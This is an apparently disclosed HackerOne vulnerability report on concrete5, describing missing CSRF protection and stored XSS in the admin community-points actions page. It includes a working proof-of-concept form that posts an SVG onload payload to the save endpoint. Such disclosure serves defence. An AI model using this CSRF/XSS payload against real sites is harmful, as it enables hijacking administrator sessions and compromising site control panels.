@@ -1,0 +1,33 @@
+ReportLink:https://hackerone.com/reports/65808
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/jmpalk
+ReportedTo:concrete5(concrete5)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:26.08.2015 20:02:49
+
+Summary:
+
+crayons
+
+The functionality to create a new community points action does not have anti-CSRF protection, and the administrator page displaying actions for which a user can be awarded community points does not have XSS protection
+
+An attacker could craft a malicious POST request to index.php/dashboard/users/points/actions/save, which can use the credentials of a logged-in administrator to create a new action for granting points. Further, the input to the upaName and upaHandle parameters are not sanitized when being stored. For example:
+
+
+    <form action="http://www.jmpalktest.com/concrete5742/index.php/dashboard/users/points/actions/save" method="post">
+      
+      <input type="hidden" name="upaID" value="" />
+      <input type="hidden" name="upaIsActive" value="1" />
+      <input type="hidden" name="upaHandle" value="<sVg/OnLOaD=prompt(1)>" />
+      <input type="hidden" name="upaName" value="XSS the admin2" />
+      <input type="hidden" name="upaDefaultPoints" value="1000" />
+      <input type="hidden" name="gBadgeID" value="" />
+
+      <button type="submit">Csrf your site here!</button>
+
+    </form>
+
+
+When the resultant data is displayed at on the Community Points page at index.php/dashboard/users/points/actions/action_saved, the stored malicious content in either upaHandle or upaName is not sanitized on output (see attached images), resulting in a stored XSS attack (with an administrator as the most likely victim), which could then be used to exploit other parts of the concrete5 control panel.
